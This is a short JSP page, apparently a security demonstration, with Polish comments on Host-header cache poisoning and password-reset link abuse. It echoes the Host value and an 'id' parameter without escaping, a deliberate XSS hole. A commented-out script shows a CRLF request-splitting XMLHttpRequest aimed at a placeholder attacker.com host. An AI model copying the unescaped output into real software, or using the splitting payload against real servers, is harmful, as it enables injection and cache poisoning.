<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>HTTP</title>
</head>
<body>
<%
// request.getServerName() pochodzi z Host z requesta HTTP
// a) + cache poisoning = stored XSS
//    e.g. interpretacja cache, Joomla
// b) link w password recovery
%>
<%= request.getServerName() %>

<br><br>
<%= request.getParameter("id") %>
<%
//<script>
    //var x = new XMLHttpRequest();
    //x.open("GET http://www.attacker.com/page1.html HTTP/1.0\r\n Host: www.attacker.com\r\nProxy-Connection: Keep-Alive\r\n\r\nGET","http://www.attacker.com/page2.html",false); x.send();
    //x.send("");
    //window.open("http://www.example.com/index.html");
//</script>
%>

</body>
</html>